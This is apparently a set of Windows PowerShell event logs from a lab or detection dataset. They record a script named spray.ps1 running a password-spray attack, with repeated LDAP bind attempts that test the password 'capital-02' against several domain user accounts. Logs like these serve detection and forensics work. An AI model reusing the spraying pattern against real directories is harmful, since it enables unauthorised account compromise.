<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4782,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=604\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, frank.kolzig, capital-02\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4757,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=571\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4753,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=566\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4776,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=596\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, steve.oneil, capital-02\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4731,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Start-Sleep\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=537\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Start-Sleep\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        Start-Sleep -Seconds $Seconds\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4762,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=578\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4737,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:     $time = Get-Date\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=544\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=    $time = Get-Date\r\n \r\n\r\nDetails: \r\nCommandInvocation(Get-Date): \"Get-Date\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4763,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=579\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4747,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=558\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4746,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=556\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, john.smith, capital-02\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4766,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=583\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4772,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=591\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4734,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Invoke-SpraySinglePassword\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=541\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Invoke-SpraySinglePassword\r\n\tCommandType=Function\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=            Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter -Quiet $Quiet\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4750,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=562\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4768,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=586\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4748,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=559\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4770,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=588\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, jeff.armstrong, capital-02\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4738,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Write-Host\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=546\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Write-Host\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=    Write-Host \"[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())\"\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4767,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=584\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, joyce.fielder, capital-02\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:48:44 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9939,"ActivityID":"{66883D06-FD3B-0001-B575-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: a13e22ad-2e30-45b8-aee3-90077942ad45\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"a13e22ad-2e30-45b8-aee3-90077942ad45","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657288124,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4759,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=574\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
